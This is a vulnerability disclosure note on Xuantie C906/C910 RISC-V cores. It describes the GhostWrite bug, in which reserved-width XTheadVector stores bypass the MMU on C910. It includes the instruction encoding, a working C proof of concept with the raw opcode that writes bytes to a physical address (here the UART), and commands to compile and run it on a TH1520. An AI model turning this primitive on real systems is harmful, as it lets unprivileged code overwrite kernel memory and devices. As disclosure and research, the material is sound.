# Summary of Bugs in Xuantie C900-series core designs

### XTheadVector unit-strided stores with reserved width may bypass the MMU

Also known as [GhostWrite](https://ghostwriteattack.com/).

In both XTheadVector and V extension 1.0, unit-strided vector stores are
encoded as,

```
  31  29   28  27 26  25  24   20 19  15 14   12 11  7 6       0
 |  nf  | mew | mop | vm | sumop |  rs1 | width | vs3 | opcode  |
 |      |     | 00  |    |       |      |       |     | 0100111 |
 |      |     |     |    |       |      |       |     |         |
```

`mew` and `width` are combined together for specifying the unit length, but
instructions with `mew = 1` (length >= 128 bits) are reserved for now.

> The mew bit (inst[28]) when set is expected to be used to encode expanded
> memory sizes of 128 bits
and above, but these encodings are currently
> reserved.
> (The RISC-V Instruction Set Manual Volume I 20240411, 31.7.3)

C906 and C910 incorrectly decode instructions with `mew = 1`, and execute them.
On C906 a Store/AMO access fault will be raised, on C910 the instruction just
bypasses the MMU, and writes the least byte of `vs3` to address `rs1`.

On C910, the instruction is able to write both MMIO and memory addresses. The
value of fields `nf` doesn't make any differences on the length of written
bytes.

#### Proof of Concept

This PoC code makes use of the bug to write a string directly to the serial,
bypassing the kernel and MMU.

```C
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>

static void
ghostwrite(uintptr_t addr, uint8_t val)
{
        asm volatile ("\n\tth.vsetvli zero, zero, e8, m1"
                      "\n\tth.vmv.v.x v0, %0"
                      "\n\tmv t0, %1"
                      "\n\t.long 0x12028027"
                      : : "r" (val), "r"(addr) : "v0", "t0", "memory");
}

static void
ghostprint(uintptr_t p, const char *s)
{
        while (*s) {
                usleep(200);
                ghostwrite(p, *s);
                s++;
        }
}

int
main(int argc, const char *argv[])
{
        if (argc != 2) {
                printf("Usage: %s <UART_BASE>\n", argv[0]);
                return 0;
        }

        uintptr_t serialBase = strtoul(argv[1], NULL, 0);

        ghostprint(serialBase, "CRACKED BY GHOSTWRITE\n\r");

        return 0;
}
```

Must be compiled with `-march=rv64gc_xtheadvector`, e.g.

```shell
gcc ghostwrite-serial.c -o ghostwrite-serial -march=rv64gc_xtheadvector
```

and run with the UART base address, for example,

```shell
./ghostwrite-serial 0xffe7014000
```

on TH1520 SoC. `CRACKED BY GHOSTWRITE` should appear on the serial.

#### Affected Variants

- C906: untested)
- C910: tested with PoC on TH1520 SoC
